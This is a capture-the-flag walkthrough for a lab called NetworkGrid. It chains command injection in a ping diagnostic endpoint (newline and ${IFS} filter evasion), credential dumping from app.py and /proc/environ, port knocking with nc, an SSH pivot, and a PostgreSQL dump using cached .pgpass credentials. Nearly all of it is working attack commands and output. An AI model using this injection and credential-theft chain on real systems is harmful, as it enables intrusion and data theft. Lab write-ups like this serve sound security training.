# NetworkGrid - Attack Walkthrough & Solution

Step-by-step offensive walkthrough to capture all three Proof-of-Breach (PoB) flags.

---

## Flag 1: Web Perimeter & Diagnostic Injection

1. **Inspect Front-End Assets:**
   Access the web portal at `http://localhost:8080/`. Viewing the HTML source reveals an external script:
   ```html
   <script src="/static/js/portal-telemetry.min.js"></script>
   ```

2. **Deobfuscate the Telemetry Script:**
   Inspecting `/static/js/portal-telemetry.min.js` reveals an internal node probe:
   * **Endpoint:** `/_sys_ops_probe/v1` (base64 decoded from `L19zeXNfb3BzX3Byb2JlL3Yx`)
   * **Required Header:** `X-Ops-Signature: WW-NODE-DIAG-802`
   * **Request Method:** `POST`
   * **Payload Format:** JSON `{"target": "<ip>"}`

3. **Bypass the Developer WAF Filter:**
   The backend utility runs `ping -c 1 -W 2 <target>` through the shell, but filters input:
   * Command chaining characters (`;`, `&`, `|`, backticks) return `400`.
   * Literal spaces and tabs return `400`.
   * Blacklisted keywords (`cat`, `sh`, `bash`, `flag`) return `400`.

   **Filter Evasion:**
   * Use **newline injection** (`\n`) to chain commands.
   * Use the shell's internal field separator `${IFS}` instead of spaces.
   * Use alternative utilities (`head`, `nl`, `more`) instead of `cat`.

4. **Dump Web Credentials:**
   Send a POST request to dump `app.py`:
   ```bash
   curl -s -X POST http://localhost:8080/_sys_ops_probe/v1 \
     -H "Content-Type: application/json" \
     -H "X-Ops-Signature: WW-NODE-DIAG-802" \
     -d '{"target": "127.0.0.1\nhead${IFS}-n${IFS}16${IFS}app.py"}'
   ```
   Credentials extracted:
   * **Username:** `wineyard`
   * **Password:** `co77age_ch332e_0rchar9`

5. **Claim Flag 1 & Knock Token 1:**
   Log in at `http://localhost:8080/`. The authenticated dashboard displays:
   ```text
   1950FLAG:you got past all web defenses.
   ```
   * **Flag 1:** `FLAG:you got past all web defenses.`
   * **First Knock Port:** `1950`

---

## Flag 2: Lateral Pivot to Stealth SSH

Enumerate the web container via the diagnostic endpoint to locate the target relay, the remaining knock ports, and the SSH credentials.

1. **Locate Target Relay IP:**
   ```bash
   curl -s -X POST http://localhost:8080/_sys_ops_probe/v1 \
     -H "Content-Type: application/json" \
     -H "X-Ops-Signature: WW-NODE-DIAG-802" \
     -d '{"target": "127.0.0.1\nhead${IFS}/etc/sync.conf"}'
   ```
   Output reveals the internal bastion relay address:
   ```ini
   relay=172.30.0.30
   ```

2. **Discover Knock Sequence Clues:**
   * Check system sync log:
     ```bash
     curl -s -X POST http://localhost:8080/_sys_ops_probe/v1 \
       -H "Content-Type: application/json" \
       -H "X-Ops-Signature: WW-NODE-DIAG-802" \
       -d '{"target": "127.0.0.1\nhead${IFS}/var/log/auth_sync.log"}'
     ```
     Contains: `Beacon dispatched to endpoint: 7777`.
   * Check periodic tasks:
     ```bash
     curl -s -X POST http://localhost:8080/_sys_ops_probe/v1 \
       -H "Content-Type: application/json" \
       -H "X-Ops-Signature: WW-NODE-DIAG-802" \
       -d '{"target": "127.0.0.1\nhead${IFS}/etc/periodic/daily/sync-task"}'
     ```
     Contains: `/usr/bin/sync_agent --verify --channel 10502`.

   Knock ports collected: **1950, 7777, 10502**.

3. **Extract SSH Private Key from Process Memory:**
   The private key was purged from the filesystem on container initialization and exists only in the environment of the background sync worker.
   * Check running processes:
     ```bash
     curl -s -X POST http://localhost:8080/_sys_ops_probe/v1 \
       -H "Content-Type: application/json" \
       -H "X-Ops-Signature: WW-NODE-DIAG-802" \
       -d '{"target": "127.0.0.1\nps${IFS}aux"}'
     ```
     Identifies `python /app/sync_worker.py` (PID 9).
   * Dump process environment:
     ```bash
     curl -s -X POST http://localhost:8080/_sys_ops_probe/v1 \
       -H "Content-Type: application/json" \
       -H "X-Ops-Signature: WW-NODE-DIAG-802" \
       -d '{"target": "127.0.0.1\nstrings${IFS}/proc/9/environ"}'
     ```
   * Extract the `IDENTITY_BLOB` containing the OpenSSH ED25519 private key. Save it locally to `fishmaster.key` and restrict permissions:
     ```bash
     chmod 600 fishmaster.key
     ```

4. **Execute Port Knock:**
   Send SYN packets to the knock sequence from the web container:
   ```bash
   curl -s -X POST http://localhost:8080/_sys_ops_probe/v1 \
     -H "Content-Type: application/json" \
     -H "X-Ops-Signature: WW-NODE-DIAG-802" \
     -d '{"target": "127.0.0.1\nnc${IFS}-z${IFS}172.30.0.30${IFS}1950\nnc${IFS}-z${IFS}172.30.0.30${IFS}7777\nnc${IFS}-z${IFS}172.30.0.30${IFS}10502"}'
   ```
   `knockd` adds an `iptables` rule allowing port 22 from the web host (`172.30.0.20`) for 30 seconds.

5. **SSH Connection & Flag 2:**
   SSH into the bastion:
   ```bash
   ssh -i fishmaster.key fishmaster@172.30.0.30
   ```
   Read Flag 2:
   ```bash
   cat /home/fishmaster/flag2.txt
   ```
   * **Flag 2:** `FLAG:congrats you got in to my ssh continue`

---

## Flag 3: Internal Database Extraction

1. **System Documentation Enumeration:**
   The SSH login MOTD banner advises:
   ```text
   Node WW-SSH-01 active. Run 'wishingwell-docs' for internal infrastructure documentation.
   ```
   Execute the documentation command:
   ```bash
   wishingwell-docs
   ```
   The documentation outlines:
   * Target database host: `172.30.0.40:5432`
   * Target database: `Wishingwell`
   * Dedicated database service account: `shepherd`
   * Automatic authentication configuration: `~/.pgpass`

2. **Inspect Cached Credentials:**
   ```bash
   cat ~/.pgpass
   ```
   Output:
   ```text
   172.30.0.40:5432:Wishingwell:shepherd:G4ld3n_c011ar_7li6ht
   ```

3. **Query PostgreSQL & Extract Flag 3:**
   Execute a query using the installed `psql` client from the bastion:
   ```bash
   psql -h 172.30.0.40 -U shepherd -d Wishingwell -c "SELECT * FROM employee_vault;"
   ```
   Output:
   ```text
    id |   username   |       role       |                     secret_note                     
   ----+--------------+------------------+-----------------------------------------------------
     1 | shepherd     | System Architect | Remember to rotate the golden collar every 30 days.
     2 | admin_backup | Database Admin   | FLAG{crown_jewels_vault_dumped_2026}
     3 | j_doe        | Junior Dev       | Left the test credentials on internal staging.
   ```
   * **Flag 3:** `FLAG{crown_jewels_vault_dumped_2026}`
